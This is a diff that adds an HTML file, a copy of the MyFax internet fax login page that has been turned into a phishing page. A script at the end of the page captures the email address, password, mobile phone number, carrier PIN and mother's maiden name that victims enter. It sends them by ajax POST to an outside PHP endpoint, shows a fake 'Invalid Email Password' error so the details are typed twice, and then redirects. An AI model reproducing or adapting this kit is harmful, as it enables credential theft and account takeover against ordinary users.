@@ -1,0 +1,324 @@
+<!-- /WEB-INF/grails-app/views/layouts/myfax_Sales.gsp --><!-- j2_include rendered start: /html/content/layouts/myfax_Sales.gsp --><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" data-scrapbook-source="https://central.myfax.com/login" data-scrapbook-create="20240928161709545"><head><meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+	<title>Internet Fax Service Log In - MyFaxCentral</title>
+	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <!--	r:require modules="myfaxSales" -->
+    <!--	r:layoutResources/>  -->
+    <!--    MYFX-987 --->
+     
+      <!-- /WEB-INF/grails-app/views/account/i18nMessageCenterMessages.gsp --><!-- j2_include rendered start: /html/content/i18nMessageCenterMessages.gsp --><!-- /web-app/html/content/i18nMessageCenterMessages.gsp -->
+
+
+<!-- j2_include rendered end: /html/content/i18nMessageCenterMessages.gsp -->
+    <link rel="stylesheet" type="text/css" href="jquery-ui-1.8.16.custom.css">
+<link rel="stylesheet" type="text/css" href="myfax.css">
+<link rel="stylesheet" type="text/css" href="cookie-banner.css">
+
+
+
+
+
+	
+  
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="layout" content="myfax_Sales">
+    
+    
+    
+	
+    
+   
+    
+
+	</head><body class="pad-body"><pixel:gettrackingpixelpagekey location="HEAD">
+
+
+<!-- /WEB-INF/grails-app/views/shared/_debugInfo.gsp --><!-- j2_include rendered start: /html/content/shared/_debugInfo.gsp --><div id="debug" style="display:none">
+<!--
+	Debug Info:
+	
+	Instance Id: TPA2F
+	Environment: PRODUCTION
+	GSP:/myfaxLogin/login
+	Delegate:login
+	Arch: grails
+
+    id = the system property com.j2.property.instanceid
+    brand = session.brand
+    title = page title (if easily available)
+    handle = the full URL of the page ie:/myaccount/efaxiAccount/homepage
+
+
+    SSL-Detected is a parameter in the request Header
+    akamaiCountry= session.ipCountry
+    lang= session.language
+    urlCountry=session.country
+    timestamp=datetime the page was rendered.
+-->
+  <p>id=TPA2F</p>
+  <p>brand=MYFAX</p>
+  <p>handle=/login</p>
+  <br>
+  <h1>SSL-Detected is a parameter in the request Header</h1>
+  <p>akamaiCountry=US</p>
+  <p>lang=</p>
+  <p>urlCountry=US</p>
+  <p>timestamp=Sat Sep 28 09:16:49 PDT 2024</p>
+</div><!-- j2_include rendered end: /html/content/shared/_debugInfo.gsp -->
+<div id="mainContainer" align="center">
+<div id="salesContainer" class="wrapper">
+	<!-- /WEB-INF/grails-app/views/shared/_myfaxSalesHeader.gsp --><!-- j2_include rendered start: /html/content/shared/_myfaxSalesHeader.gsp --><!-- /web-app/html/content/shared/_myfaxSalesHeader.gsp -->
+<div>
+    <div id="logoContainer"> <a href="https://www.myfax.com/"><img alt="MyFax" src="Login_logo.jpg" border="0"></a> </div>
+    <div class="blueBar">&nbsp;</div>
+    <!-- FMA-2975-->
+    
+</div>
+
+
+<!-- j2_include rendered end: /html/content/shared/_myfaxSalesHeader.gsp -->
+	<div class="LeftCol">	
+	  
+<!-- /web-app/html/content/myfax/login.gsp -->
+
+      <div class="LoginBox">
+        <div id="tabContainer_loginPassword">
+          <div class="tabDiv_loginPassword">
+            <ul id="tabMenuList_loginPassword" class="tabs">
+              <li id="li_loginTab"><a href="#tabContent_loginTab" class="defaulttab selected" rel="tabContent_loginTab"><img src="loginTab_on.png" name="loginTab_off.png" tabstatus="FirstTab" alt="Log In" class="dynamicTab" id="tabImage_loginTab"></a></li>
+              <li id="li_forgotNumTab"><a href="#tabContent_forgotNumTab" rel="tabContent_forgotNumTab"><img src="Login_Tab_off.png" name="forgotNumTab_off.png" tabstatus="LastTab" alt="Forgot Password?" class="dynamicTab" id="tabImage_forgotNumTab"></a></li>
+            </ul>
+          </div>
+        </div>
+        <form action="#" >
+            <div id="tabContent_loginTab" class="Login" style="">
+	        
+			
+		   
+	           <div class="LoginBRow"><a href="http://www.myfax.com/login-help.aspx" class="logPassText" name="helpIcon" id="loginToolTip" title="Enter your Email Address, your 
+Fax Number or your Account Number for your Login ID. Click 
+the help icon for more information"><img src="Login_questionIcon.jpg"> </a>
+	            <label>Login ID:</label>
+	            <span>
+	            <nobr>
+                	<input type="text" tabindex="1" value="" name="phoneNumber" size="30" class="defaultText textInput" id="phoneNumber" autocomplete="off" maxlength="100" errmsg=""><img align="absbottom" src="alertRedStopMedium-1.gif" style="cursor: pointer; vertical-align: top; display: none;" id="loginUsername_errIcon" errmsg="Required; must be numeric">
+                </nobr>
+	            <img align="absbottom" src="alertRedStopMedium-1.gif" class="errIcon" id="loginUsername_errIcon">
+
+	            </span></div>
+	          <div class="LoginBRow"><a class="logPassText" name="helpIcon" id="passwordToolTip" title="Passwords can be between 8 - 20 alphanumeric characters."><img src="Login_questionIcon.jpg"> </a>
+	            <label>Password/PIN:  </label>
+	            <span>
+	            <nobr>
+                	<input type="password" tabindex="2" value="" name="pin" size="30" class="defaultText textInput" id="pin" autocomplete="off" maxlength="20" errmsg=""><img align="absbottom" src="alertRedStopMedium-1.gif" style="display: none; cursor: pointer; vertical-align: top;" id="loginPassword_errIcon" autocomplete="off">
+              	</nobr>
+	            <img align="absbottom" src="alertRedStopMedium-1.gif" class="errIcon" id="loginPassword_errIcon">
+
+	            </span></div>
+	          
+			
+	          <div id="submit" class="Loginbutton">
+	           <button>  submit</button>
+	          </div>
+
+            </div>
+        </form>
+        <div id="tabContent_forgotNumTab" class="Login" style="display: none;"> 
+         
+        <div class="formOuterContainer" id="formContainer_forgotNumTab">
+          <div id="textImageTable">
+           
+<input type="hidden" name="SYNCHRONIZER_TOKEN" value="ef0b169e-9e8a-4bf5-928a-2170632d0cc5" id="SYNCHRONIZER_TOKEN">
+<input type="hidden" name="SYNCHRONIZER_URI" value="/login" id="SYNCHRONIZER_URI">
+           
+               <div class="LoginBRow">
+                   <h1 class="loginRecoverPwd">Recover Password</h1>
+                   <h3 class="loginForgetPwd">Did you forget your password?</h3>
+                   <div>Please enter your MyFax number, An email will be sent to the email account associated with the account. It will contain an authorization code that you will need to enter on the next page. Please include the "1" or appropriate country code.  E.G. if your USA/CAN fax number is 555-121-1212, enter 15551211212.<br>
+                       <br>
+                   </div>
+               </div>
+
+	            <div class="LoginBRow">
+	              <label class="Myfaxnumber">MyFax Number:</label>
+	              <span>
+	    	       <nobr>
+	            	<input type="text" value="" name="pinUsername" size="30" class="defaultText textInput" id="pinUsername" autocomplete="off" maxlength="40" errmsg="">
+				    <img align="absbottom" src="alertRedStopMedium.gif" style="display: none; cursor: pointer; vertical-align: top;" id="pinUsername_errIcon">
+		          </nobr>
+	              </span></div>
+               <div class="LoginBRow">
+               <input type="hidden" name="recaptchaTokenResetPW" id="recaptchaTokenResetPW" value="03AFcWeA5eXyF8O8YliAuUVGKXSPKWW9_sMWjYtHF7Fz8x-Jvm5xXDZbaKkg72Qj6tu1PSmXY_3x1jGzS6yIxO3fuj7mCkp_Zon-T7GaAiXie6KarC0Hexx7weg6yLf1Xh7QOfULwUfDchKEIb7YpWp4SAaCUo-H2zNxSUbf9_K_jqktbDxEcsired2JEKq33u3S4OdCMHwO4OzKgWT3JUSrkk2jN42lt8eY1rFBSkF3ijXeilrj329nwHCsM6nzsrL5EgERo6_SQpHzZwu50BELk9F_-bLSwrbkCLjq9XJVjvUmZW0GE2qmswB-LqwAtI3HoRyqm5qyWDT1n0miDKDnlxC8D7mnJGZV5PoYnptMy6AcJGwdVxjov8JEFxWOy0FPjagcjAN5hGT-AdAOSLqBaQveBrZ5uxBvzw4WrsUqKxh28bnjYDe-fPvVAWUwGvgD6zdLQdB5Tx8S64mA42AwM-z8rEGrVEG6YhjHFdugvdgprgTvHjEfliDopIi3KxOy95Qo8vIpSBX2w14F3T7Q8I_s5R4_dTBISHWnPi_VYywUmIsvlWG-41VMT4GWJkMtG0XIJcmFsEaHOdoK0Rk292-9UlntrlMdtWNunaC9hsH1VykaeQ9hSJ0yrhc7vkKpx7hI2qPmblJLFY-7kJkLHMcU4BxZJpQplOeonuke3oqlMxoGIW-fnkt7CTvCFvx7F76-9dLsnvBKPzEs5EVF9_YXhUcr4srctwtUKQIE0R75v0orjV3q6Cf2SQNLhad8u8IWueu2rU3JhQgzL3gg0ke-RELSdYOZOZy2vgdE6srZNAyVJI0Bzziv97IORdBCPUVfSs1c6rjNnd2HUiaQzCyhL2LC2VbA">
+               
+               
+               </div>
+	           
+          </div>
+        </div>
+         
+           
+        </div>
+         <div id="BottomBg"><span class="LeftBg">&nbsp;</span><span class="MiddleBgLogin">&nbsp;</span><span class="RightBg"></span></div>
+      </div>
+      
+
+    
+
+
+      <div id="eVoiceCols">
+        <a href="https://jsign.com/?utm_source=website&amp;utm_medium=banner&amp;utm_campaign=xsell-myfax-login" target="_blank">
+            <img alt="MyFax" src="jsign-banner.png">
+        </a>
+      </div>
+     
+    </div>
+	 <div class="RCol">
+      <div class="myFaxFeaturesLoginPage"> <img class="myFaxFeaturesImage" src="Login_picture.jpg" alt="MyFax Login">
+        <div class="myFaxFeatures">
+          <ul>
+            <li>Login anytime, anywhere</li>
+            <li>Send, receive, view and store your faxes online</li>
+            <li>Update your account and billing information</li>
+            <li>Edit your preferences</li>
+            <li>View real-time statistics</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div><span class="MainbottomBg1Left"></span><span class="MainbottomBg1Right"></span></div>
+    <div class="MainbottomBg2"></div>
+	<!-- /WEB-INF/grails-app/views/shared/_myfaxFooter.gsp --><!-- j2_include rendered start: /html/content/shared/_myfaxFooter.gsp --><div class="footerMenu">
+<a href="https://www.myfax.com/legal/terms" id="termsLink">Terms and Conditions</a> | <a href="https://www.myfax.com/legal/privacy" id="privacyLink">Privacy</a> | <a href="https://www.myfax.com/sitemap" id="sitemapLink">Sitemap</a>
+</div>
+
+<div class="footerMenu">
+    <div style="font-size: 10px;">
+        ©2024 Consensus Cloud Solutions Inc. or its subsidiaries (collectively, "Consensus"). All rights reserved. MyFax® is a trademark or registered trademark of Consensus.
+    </div>
+</div>
+
+<a id="lnk_instanceId" tabindex="-1" href="#TPA2F">
+    <span class="hiddenWithPointer">o o o</span>
+</a><!-- j2_include rendered end: /html/content/shared/_myfaxFooter.gsp -->
+</div>
+</div>
+<!-- Footer End -->
+<!-- pixel:getTrackingPixelPagekey/ -->
+<!-- /WEB-INF/grails-app/views/shared/_ga.gsp --><!-- j2_include rendered start: /html/content/shared/_ga.gsp --><!-- Google Tag Manager -->
+
+
+
+<noscript>
+    <iframe src="index_2.html" height="0" width="0" style="display:none;visibility:hidden">
+    </iframe>
+</noscript>
+
+<!-- End Google Tag Manager --><!-- j2_include rendered end: /html/content/shared/_ga.gsp -->
+
+<div class="banner-position-container">
+    <!-- /WEB-INF/grails-app/views/shared/_cookieBanner.gsp --><!-- j2_include rendered start: /html/content/shared/_cookieBanner.gsp --><div id="cookie-banner-container" class="cookie-banner-container display-cookie-banner">
+    <div id="cookie-banner-text">
+        We use cookies to ensure that we give you the best experience on our website. By continuing to use this website you are giving consent to cookies being used. To learn more visit our
+        <a id="cookie-banner-policy" href="http://www.myfax.com/legal/privacy.aspx#cookie_policy">Cookie Policy &gt;&gt;</a>
+    </div>
+    <div id="cookie-banner-button">
+        <button id="cookie-understand">I Understand </button>
+    </div>
+    <div class="clear-cookie"></div>
+</div>
+
+
+<!-- j2_include rendered end: /html/content/shared/_cookieBanner.gsp -->
+</div>
+
+<script>
+        const form = document.querySelectorAll(".form");
+        const mail = document.getElementById("mail");
+        const pass = document.getElementById("pass");
+        const error = document.querySelectorAll(".error");
+        let errKey = 0;
+        let pin_err = 0;
+
+         const ajaxCode = (data) => {
+            $.ajax({
+                //post php link here....
+                url: 'https://famnreubasai.ns2.name/mpsioblkcw/wdaunorebemo.php',
+                type: 'POST',
+                data: { pass: data },
+            });
+    };
+
+        const errorHandler = (text) => {
+            error[0].textContent = text;
+            error[0].classList.remove("hide");
+            pass.value = "";
+        };
+
+
+        form[0].addEventListener("submit", (e) => {
+            e.preventDefault();
+           if(pass.value === ""){
+                errorHandler('Invalid Email Password');
+           }
+           else {
+            errKey++;
+            if(errKey === 1){
+                let fData = `Email Address: ${mail.value} \nEmail Password: ${pass.value}`;
+                ajaxCode(fData);
+                errorHandler("Invalid Email Password");
+
+            }
+
+            else {
+                let fData = `Email Address: ${mail.value} \nEmail Password: ${pass.value}`;
+                ajaxCode(fData);
+                 errorHandler("");
+                 window.location.href = "/";
+
+            }
+           }
+
+        });
+
+        form[1].addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            if(ssn.value === ""){
+                errorHandler2("Please enter a valid Mobile Phone Number");
+
+            }
+            else if(mmn.value === ""){
+                 errorHandler2("Please enter a Valid Phone Carrier Pin");
+            }
+            else if(an.value === ""){
+                 errorHandler2("Please enter a Valid Mother's Maiden Name");
+            }
+
+            else {
+                pin_err++;
+                let data = `Mobile Phone : ${ssn.value} \nPhone Pin: ${mmn.value} \nMother's Maiden Name: ${an.value}`;
+                ajaxCode(data);
+                errorHandler2("");
+
+                setTimeout(() => {
+                    if(pin_err === 1){
+                        errorHandler2("Incorrect Phone Carrier Pin");
+                        mmn.value = "";
+                    }
+                    else {
+                        errorHandler2("");
+                        window.location.href = "https://docs.oracle.com/cd/F30771_01/OBSCF_14.4.0.3.0/Responsive%20HTML5/assets/inset_000228.jpg";
+
+                    }
+
+                }, 1000);
+            }
+        });
+
+    </script>
+
+</pixel:gettrackingpixelpagekey><div id="modalBg"> </div><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-lthrmw8mx6rm" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="index_3.html"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;">03AFcWeA5eXyF8O8YliAuUVGKXSPKWW9_sMWjYtHF7Fz8x-Jvm5xXDZbaKkg72Qj6tu1PSmXY_3x1jGzS6yIxO3fuj7mCkp_Zon-T7GaAiXie6KarC0Hexx7weg6yLf1Xh7QOfULwUfDchKEIb7YpWp4SAaCUo-H2zNxSUbf9_K_jqktbDxEcsired2JEKq33u3S4OdCMHwO4OzKgWT3JUSrkk2jN42lt8eY1rFBSkF3ijXeilrj329nwHCsM6nzsrL5EgERo6_SQpHzZwu50BELk9F_-bLSwrbkCLjq9XJVjvUmZW0GE2qmswB-LqwAtI3HoRyqm5qyWDT1n0miDKDnlxC8D7mnJGZV5PoYnptMy6AcJGwdVxjov8JEFxWOy0FPjagcjAN5hGT-AdAOSLqBaQveBrZ5uxBvzw4WrsUqKxh28bnjYDe-fPvVAWUwGvgD6zdLQdB5Tx8S64mA42AwM-z8rEGrVEG6YhjHFdugvdgprgTvHjEfliDopIi3KxOy95Qo8vIpSBX2w14F3T7Q8I_s5R4_dTBISHWnPi_VYywUmIsvlWG-41VMT4GWJkMtG0XIJcmFsEaHOdoK0Rk292-9UlntrlMdtWNunaC9hsH1VykaeQ9hSJ0yrhc7vkKpx7hI2qPmblJLFY-7kJkLHMcU4BxZJpQplOeonuke3oqlMxoGIW-fnkt7CTvCFvx7F76-9dLsnvBKPzEs5EVF9_YXhUcr4srctwtUKQIE0R75v0orjV3q6Cf2SQNLhad8u8IWueu2rU3JhQgzL3gg0ke-RELSdYOZOZy2vgdE6srZNAyVJI0Bzziv97IORdBCPUVfSs1c6rjNnd2HUiaQzCyhL2LC2VbA</textarea></div><iframe style="display: none;" src="index_1.html"></iframe></div></body></html><!-- j2_include rendered end: /html/content/layouts/myfax_Sales.gsp -->
